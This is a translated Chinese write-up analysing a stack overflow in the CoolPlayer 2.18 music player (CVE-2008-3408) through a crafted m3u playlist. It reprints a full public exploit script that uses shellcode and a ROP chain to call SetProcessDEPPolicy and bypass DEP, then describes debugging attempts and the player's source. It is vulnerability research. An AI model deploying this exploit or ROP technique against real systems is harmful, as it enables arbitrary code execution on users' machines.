# CoolPlayer bypass DEP(CVE-2008-3408)分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 环境搭建
CoolPlayer 是一款MP3播放软件，功能丰富，界面美观，十年前就已经停止更新，但直至现在依然还有人在下载使用
根据[exploitdb](https://www.exploit-db.com/exploits/15895)，CoolPlayer
2.18在处理`m3u`文件时，存在栈溢出，并且可以绕过`DEP`执行代码。
根据[维基百科](https://zh.wikipedia.org/wiki/M3U)对`m3u`文件的解释
    M3U文件是一种纯文本文件，可以指定一个或多个多媒体文件的位置，其文件扩展名是“M3U”或者“m3u”。
    M3U文件具有多个条目，每个条目的格式可以是以下几种格式之一：
        一个绝对路径；比如：C:My MusicHeavysets.mp3
        一个相对路径（相对于M3U文件的路径）；比如：Heavysets.mp3
        一个URL
    M3U文件也有注释，注释行以"#"字符开头，在扩展M3U文件中，"#"还引入了扩展M3U指令。
    M3U文件的作用通常是创建指向在线流媒体的播放列表，创建的文件可以轻松访问流媒体。M3U文件通常作为网站的下载资源、通过email收发，并可以收听网络电台。
    如果使用编辑器编辑M3U文件，必须将该文件用Windows-1252格式保存，这种格式是ASCII编码的超集。M3U文件也可以使用Latin-1字符编码。
简单点可以理解，`m3u`是是一种存放文件列表的文本文件(理解这个，对下面的分析很重要)。
利用的`exploit`
    # Exploit Title: CoolPlayer 2.18 DEP Bypass
    # Date: January 2, 2011
    # Author: Blake
    # Version: 2.18
    # Tested on: Windows XP SP3 running in Virtualbox
    # Uses SetProcessDEPPolicy() to disable DEP for the process
    # Thanks to mr_me for the encouragement
    # Exploit-DB Notes: May not work on all Win XP SP3 machines
    print "n============================"
    print "CoolPlayer 2.18 DEP Bypass"
    print "Written by Blake"
    print "============================n"
    # windows/exec calc.exe 227 bytes - 240 bytes of shellcode space available
    shellcode =(
    "xdaxdaxd9x74x24xf4xbfxe7x18x22xfbx2bxc9xb1x33"
    "x5ex31x7ex17x83xeexfcx03x99x0bxc0x0ex99xc4x8d"
    "xf1x61x15xeex78x84x24x3cx1excdx15xf0x54x83x95"
    "x7bx38x37x2dx09x95x38x86xa4xc3x77x17x09xccxdb"
    "xdbx0bxb0x21x08xecx89xeax5dxedxcex16xadxbfx87"
    "x5dx1cx50xa3x23x9dx51x63x28x9dx29x06xeex6ax80"
    "x09x3exc2x9fx42xa6x68xc7x72xd7xbdx1bx4ex9exca"
    "xe8x24x21x1bx21xc4x10x63xeexfbx9dx6exeex3cx19"
    "x91x85x36x5ax2cx9ex8cx21xeax2bx11x81x79x8bxf1"
    "x30xadx4ax71x3ex1ax18xddx22x9dxcdx55x5ex16xf0"
    "xb9xd7x6cxd7x1dxbcx37x76x07x18x99x87x57xc4x46"
    "x22x13xe6x93x54x7ex6cx65xd4x04xc9x65xe6x06x79"
    "x0exd7x8dx16x49xe8x47x53xabx19x5ax49x3cx80x0f"
    "x30x20x33xfax76x5dxb0x0fx06x9axa8x65x03xe6x6e"
    "x95x79x77x1bx99x2ex78x0exfaxb1xeaxd2xd3x54x8b"
    "x71x2c")
    buffer = "x41" * 220
    eip = "x28xb0x9fx7c"                # POP ECX / RETN - SHELL32.DLL 7C9FB028
    offset1 = "x42" * 4
    nop = "x90" * 10
    # put zero in EBX
    rop = "xddxadx9ex7c"                # POP EBX / RETN - SHELL32.DLL 7C9EADDD
    rop += "xffxffxffxff"                # placed into ebx
    rop += "xe1x27xc1x77"                # INC EBX / RETN - MSVCRT.DLL 77C127E1
    # set EBP to point to SetProcessDEPPolicy
    rop += "x7bxa6x9ex7c"                # POP EBP / RETN - SHELL32.DLL 7C9EA67B
    rop += "xa4x22x86x7c"                # address of SetProcessDEPPolicy XP SP3
    # set EDI as a pointer to RET (rop nop)
    rop += "x47xebx9ex7c"                # POP EDI / RETN - SHELL32.DLL 7C9EEB47
    rop += "x08x15x9cx7c"                # RETN - SHELL32.DLL 7C9C1508            
    # set ESI as a pointer to RET (rop nop)
    rop += "x4cx20x9cx7c"                # POP ESI / RETN - SHELL32.DLL 7C9C204C
    rop += "x51x20x9cx7c"                # RETN - SHELL32.DLL 7C9C2051            
    # set ESP to point at nops
    rop += "x73x10xa1x7c"                # PUSHAD / RETN - SHELL32.DLL 7CA11073
    print "[*] Creating malicious m3u file"
    try:
        file = open("exploit.m3u","w")
        file.write(buffer + eip + offset1 + rop + nop + shellcode)
        file.close()
        print "[*] File created"
    except:
        print "[x] Error creating file!"
    raw_input("nPress any key to exit...")
[软件地址(包含源码和二进制可执行程序)](https://sourceforge.net/projects/coolplayer/files/Coolplayer/218/)
测试环境
    windows cn xp sp3
    windbg
    vc 6.0
    immunity debugger/mona.py
## 漏洞分析
`mona`生成匹配串，之后利用`windbg`直接跑，可以发现溢出出错了
但是这里有个很奇怪的一点，调用栈没用。无法根据调用栈回溯到出错位置。试了各种各样的办法，也确定了溢出长度为`260`，使用`264`长度的串，依然无法观察到。尝试查看所有线程的调用栈，看看是否能够发现什么
其中唯独有关的位置`image00400000+0xdbd6(40dbd6)`，利用`IDA`查看，依然也没有发现
由于分析经验不足，尝试了各种各样的方法，但是依然没有解决这个问题，找不到出错的位置。最后实在没有办法就想起了直接啃源码，这种比较笨拙的办法了。
## 源码分析
源码整体的框架
是使用`VC6.0`这种上古神器编译的，其实也就可以知道了，是可以绕过`DEP`的，这里暂时不谈。
`main.c`结构
细看一下`WinMain`，是一个完整的`windows`消息处理程序，找到窗口处理过程，查看功能实现代码，其`WM_LBUTTONUP`实现了其窗口的各种功能，包括下一首，上一首，皮肤处理等等。
    case WM_LBUTTONUP:
            {
                int     teller;
                ReleaseCapture();
                globals.main_bool_slider_keep_focus = FALSE;
                cursorpos = MAKEPOINTS(lParam);
                for (teller = PlaySwitch; teller = Skin.Object[teller].x
                            && cursorpos.y >= Skin.Object[teller].y
                            && cursorpos.x = Skin.Object[TimeText].x
                        && cursorpos.y >= Skin.Object[TimeText].y
                        && cursorpos.x <=
                        (Skin.Object[TimeText].x + (Skin.Object[TimeText].w * 8))
                        && cursorpos.y <=